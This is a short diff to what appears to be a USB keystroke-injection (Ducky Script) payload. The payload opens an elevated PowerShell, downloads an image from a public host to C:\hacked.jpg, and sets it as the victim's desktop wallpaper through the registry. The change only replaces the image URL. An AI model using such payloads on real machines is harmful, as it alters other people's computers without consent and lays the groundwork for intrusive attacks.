@@ -40,9 +40,9 @@ DELAY 350
 STRING powershell
 CTRL-SHIFT ENTER
 DELAY 350
-STRING Invoke-WebRequest -Uri https://wallpaperaccess.com/full/896790.png -OutFile C:\hacked.png
+STRING Invoke-WebRequest -Uri https://i.pinimg.com/originals/c1/50/7d/c1507daacebab64368d98d3e71e13661.jpg -OutFile C:\hacked.jpg
 ENTER
-STRING Set-ItemProperty -Path "HKCU:Control Panel\Desktop" -Name WallPaper -Value C:\hacked.png
+STRING Set-ItemProperty -Path "HKCU:Control Panel\Desktop" -Name WallPaper -Value C:\hacked.jpg
 ENTER
 STRING rundll32.exe user32.dll, UpdatePerUserSystemParameters 0, True; exit
 ENTER
